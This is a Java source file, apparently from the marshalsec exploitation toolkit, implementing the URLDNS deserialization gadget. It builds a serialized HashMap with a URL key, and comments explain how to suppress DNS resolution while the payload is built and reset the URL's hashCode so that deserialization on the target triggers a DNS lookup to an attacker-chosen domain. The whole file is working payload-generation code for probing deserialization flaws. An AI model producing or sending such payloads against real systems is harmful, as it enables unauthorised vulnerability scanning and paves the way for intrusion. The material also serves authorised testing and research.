package marshalsec.gadgets;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import marshalsec.UtilFactory;
import marshalsec.util.Reflections;


public interface URLDNS extends Gadget {

  @Args(minArgs = 1, args = {
      "DNSURL"})
  default Object makeURLDNS(UtilFactory uf, String[] args) throws Exception {

    //Avoid DNS resolution during payload creation
    //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
    URLStreamHandler handler = new SilentURLStreamHandler();

    HashMap ht = new HashMap(); // HashMap that will contain the URL
    URL u = new URL(null, args[0], handler); // URL to use as the Key
    ht.put(u,
        args[0]); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

    Reflections.setFieldValue(u, "hashCode",
        -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

    return ht;
  }

  class SilentURLStreamHandler extends URLStreamHandler {

    protected URLConnection openConnection(URL u) throws IOException {
      return null;
    }

    protected synchronized InetAddress getHostAddress(URL u) {
      return null;
    }
  }

}
